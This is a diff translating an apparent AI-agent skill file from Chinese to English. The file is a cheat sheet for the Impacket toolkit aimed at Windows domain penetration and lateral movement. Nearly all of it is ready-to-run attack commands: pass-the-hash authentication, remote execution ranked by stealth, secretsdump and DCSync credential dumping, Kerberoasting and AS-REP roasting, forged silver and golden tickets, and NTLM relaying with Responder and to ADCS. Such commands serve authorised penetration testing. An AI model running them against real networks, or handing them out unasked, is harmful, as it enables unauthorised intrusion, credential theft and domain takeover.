@@ -1,105 +1,107 @@
 ---
 name: impacket-toolkit
-description: "Impacket Windows 协议工具集。当需要通过 SMB/Kerberos/WMI/DCOM/MSSQL 等 Windows 协议进行远程操作时使用。覆盖 secretsdump 凭据导出、psexec/wmiexec 远程执行、Kerberos 攻击、NTLM 中继，是域渗透和 Windows 横向移动的基础工具集"
+description: "Impacket Windows protocol toolkit. Use when remote operations over Windows protocols such as SMB/Kerberos/WMI/DCOM/MSSQL are required. Covers secretsdump credential dumping, psexec/wmiexec remote execution, Kerberos attacks, and NTLM relaying, and is the foundational toolkit for domain penetration and Windows lateral movement"
+zh-signals: "Impacket Windows 协议工具集，覆盖 secretsdump 凭据导出、psexec/wmiexec 远程执行、Kerberos 攻击与 NTLM 中继。信号:Impacket,secretsdump,psexec,NTLM中继,Kerberos,横向移动"
+when-to-use: "Use when you need to operate over Windows protocols such as SMB/Kerberos/WMI/DCOM/MSSQL, including credential dumping, remote execution, Kerberos attacks, and NTLM relaying."
 metadata:
-  tags: "impacket,secretsdump,psexec,wmiexec,smbexec,dcomexec,ntlmrelayx,kerberos,smb,windows,域,横向移动,凭据,GetNPUsers,GetUserSPNs"
+  tags: "impacket,secretsdump,psexec,wmiexec,smbexec,dcomexec,ntlmrelayx,kerberos,smb,windows,domain,lateral-movement,credential,GetNPUsers,GetUserSPNs"
   category: "tool"
 ---
 
-# Impacket Windows 协议工具集
+# Impacket Windows Protocol Toolkit
 
-Impacket 用纯 Python 实现了 Windows 网络协议栈，在 Linux 上就能直接操作 Windows 目标——不需要在目标上安装任何东西。
+Impacket implements the Windows network protocol stack in pure Python, allowing you to operate against Windows targets directly from Linux—without installing anything on the target.
 
-项目地址：https://github.com/fortra/impacket
+Project URL: https://github.com/fortra/impacket
 
-## 认证方式
+## Authentication Methods
 
-Impacket 所有工具都支持多种认证方式，理解这些格式很重要：
+All Impacket tools support multiple authentication methods, and understanding these formats is important:
 
 ```bash
-# 密码认证
+# Password authentication
 tool.py DOMAIN/user:password@TARGET
 
-# NTLM 哈希传递 (Pass-the-Hash)
+# NTLM pass-the-hash (PtH)
 tool.py DOMAIN/user@TARGET -hashes LM:NTLM
-tool.py DOMAIN/user@TARGET -hashes :NTLM  # LM 部分可省略
+tool.py DOMAIN/user@TARGET -hashes :NTLM  # the LM part can be omitted
 
-# Kerberos 票据认证
+# Kerberos ticket authentication
 export KRB5CCNAME=/tmp/user.ccache
 tool.py DOMAIN/user@TARGET -k -no-pass
 
-# 本地用户（不在域内）
+# Local user (not in the domain)
 tool.py ./administrator:password@TARGET
 ```
 
-## 远程命令执行
+## Remote Command Execution
 
-从无交互到全交互，选最稳定的：
+Pick the most stable option, from non-interactive to fully interactive:
 
 ```bash
-# psexec — 通过 SMB 创建服务执行（最常用，需要管理员权限）
+# psexec — executes by creating a service over SMB (most common, requires admin rights)
 psexec.py DOMAIN/admin:password@TARGET
 psexec.py DOMAIN/admin@TARGET -hashes :NTLM_HASH
 
-# smbexec — 通过 SMB 管道执行（不上传二进制，更隐蔽）
+# smbexec — executes over an SMB pipe (no binary upload, more stealthy)
 smbexec.py DOMAIN/admin:password@TARGET
 
-# wmiexec — 通过 WMI 执行（不创建服务，最隐蔽）
+# wmiexec — executes via WMI (creates no service, most stealthy)
 wmiexec.py DOMAIN/admin:password@TARGET
 
-# dcomexec — 通过 DCOM 执行（备选）
+# dcomexec — executes via DCOM (alternative)
 dcomexec.py DOMAIN/admin:password@TARGET
 
-# atexec — 通过计划任务执行（不需要交互式 shell）
+# atexec — executes via a scheduled task (no interactive shell required)
 atexec.py DOMAIN/admin:password@TARGET "whoami"
 ```
 
-### 选择建议
+### Selection Recommendations
 
-| 工具 | 协议 | 端口 | 隐蔽性 | 交互式 |
+| Tool | Protocol | Port | Stealth | Interactive |
 |------|------|------|--------|--------|
 | wmiexec | WMI/DCOM | 135 | ⭐⭐⭐ | ✅ |
 | smbexec | SMB | 445 | ⭐⭐ | ✅ |
 | psexec | SMB | 445 | ⭐ | ✅ |
-| atexec | 任务计划 | 445 | ⭐⭐ | ❌ |
+| atexec | Scheduled task | 445 | ⭐⭐ | ❌ |
 | dcomexec | DCOM | 135 | ⭐⭐ | ✅ |
 
-## 凭据导出
+## Credential Dumping
 
 ```bash
-# secretsdump — 域渗透最重要的工具，导出所有凭据
-# 远程导出（需要域管/本地管理员）
+# secretsdump — the most important tool for domain penetration, dumps all credentials
+# Remote dump (requires Domain Admin/local administrator)
 secretsdump.py DOMAIN/admin:password@TARGET
 secretsdump.py DOMAIN/admin@TARGET -hashes :NTLM_HASH
 
-# 导出 DC 上所有域用户哈希（DCSync）
+# Dump all domain user hashes on the DC (DCSync)
 secretsdump.py DOMAIN/admin:password@DC_IP -just-dc
 
-# 只导出 NTLM（不导出 Kerberos 密钥）
+# Dump only NTLM (no Kerberos keys)
 secretsdump.py DOMAIN/admin:password@DC_IP -just-dc-ntlm
 
-# 从本地 SAM/SYSTEM 文件导出
+# Dump from local SAM/SYSTEM files
 secretsdump.py -sam SAM -system SYSTEM LOCAL
 ```
 
-## Kerberos 攻击
+## Kerberos Attacks
 
 ```bash
-# AS-REP Roasting — 查找不需要预认证的账户
+# AS-REP Roasting — find accounts that do not require pre-authentication
 GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP -format hashcat
-# 输出喂给 hashcat -m 18200
+# Feed the output to hashcat -m 18200
 
-# Kerberoasting — 获取服务票据离线破解
+# Kerberoasting — obtain service tickets and crack them offline
 GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request
-# 输出喂给 hashcat -m 13100
+# Feed the output to hashcat -m 13100
 
-# 获取 TGT
+# Obtain a TGT
 getTGT.py DOMAIN/user:password -dc-ip DC_IP
-# 生成 user.ccache → export KRB5CCNAME=user.ccache
+# Generates user.ccache → export KRB5CCNAME=user.ccache
 
-# 获取 ST（约束委派 S4U 利用）
+# Obtain an ST (constrained delegation S4U abuse)
 getST.py DOMAIN/svc_account:password -spn cifs/TARGET -impersonate administrator -dc-ip DC_IP
-# -altservice 可替换服务类型
+# -altservice can substitute the service type
 
 # Silver Ticket
 ticketer.py -nthash SERVICE_NTLM -domain-sid S-1-5-21-... -domain DOMAIN -spn cifs/TARGET user
@@ -108,66 +110,66 @@ ticketer.py -nthash SERVICE_NTLM -domain-sid S-1-5-21-... -domain DOMAIN -spn ci
 ticketer.py -nthash KRBTGT_NTLM -domain-sid S-1-5-21-... -domain DOMAIN -extra-sid S-1-5-21-PARENT-519 user
 ```
 
-## 枚举工具
+## Enumeration Tools
 
 ```bash
-# SID 枚举（发现用户/组 RID）
+# SID enumeration (discover user/group RIDs)
 lookupsid.py DOMAIN/user:password@TARGET
 
-# RPC 枚举（暴露的接口）
+# RPC enumeration (exposed interfaces)
 rpcdump.py DOMAIN/user:password@TARGET
 
-# SAM 用户枚举
+# SAM user enumeration
 samrdump.py DOMAIN/user:password@TARGET
 
-# 远程注册表操作
+# Remote registry operations
 reg.py DOMAIN/admin:password@TARGET query -keyName HKLM\\SOFTWARE
 ```
 
-## NTLM 中继
+## NTLM Relaying
 
 ```bash
-# 中继到 SMB（获取 shell 或 secretsdump）
+# Relay to SMB (get a shell or run secretsdump)
 ntlmrelayx.py -t smb://TARGET -smb2support
 ntlmrelayx.py -t smb://TARGET -smb2support -c "whoami"
 
-# 中继到 LDAP（域内 ACL 修改）
+# Relay to LDAP (in-domain ACL modification)
 ntlmrelayx.py -t ldap://DC_IP --escalate-user user
 
-# 中继到 ADCS Web Enrollment（ESC8）
+# Relay to ADCS Web Enrollment (ESC8)
 ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController
 
-# 配合 Responder 使用
-# 终端 1: responder -I eth0 -wv（抓 NTLM）
-# 终端 2: ntlmrelayx.py -t smb://TARGET（中继 NTLM）
+# Use together with Responder
+# Terminal 1: responder -I eth0 -wv (capture NTLM)
+# Terminal 2: ntlmrelayx.py -t smb://TARGET (relay NTLM)
 ```
 
-## SMB 文件操作
+## SMB File Operations
 
 ```bash
-# SMB 客户端
+# SMB client
 smbclient.py DOMAIN/user:password@TARGET
 
-# 列出共享
+# List shares
 smbclient.py DOMAIN/user:password@TARGET -list
 
-# 上传/下载文件
+# Upload/download files
 smbclient.py DOMAIN/user:password@TARGET
 # > use SHARE_NAME
 # > put local_file
 # > get remote_file
 ```
 
-## 决策树
+## Decision Tree
 
 ```
-需要做什么 Windows 操作？
-├─ 远程执行命令 → wmiexec（隐蔽）/ psexec（稳定）
-├─ 导出凭据/哈希 → secretsdump
-├─ Kerberos 攻击 → GetNPUsers / GetUserSPNs
-├─ NTLM 中继 → ntlmrelayx + Responder
-├─ 文件操作 → smbclient
-├─ 有密码 → 直接用 user:password
-├─ 有 NTLM 哈希 → -hashes :NTLM（PTH）
-└─ 有 Kerberos 票据 → -k -no-pass
+What Windows operation do you need?
+├─ Remote command execution → wmiexec (stealthy) / psexec (stable)
+├─ Dump credentials/hashes → secretsdump
+├─ Kerberos attacks → GetNPUsers / GetUserSPNs
+├─ NTLM relaying → ntlmrelayx + Responder
+├─ File operations → smbclient
+├─ Have a password → use user:password directly
+├─ Have an NTLM hash → -hashes :NTLM (PtH)
+└─ Have a Kerberos ticket → -k -no-pass
 ```
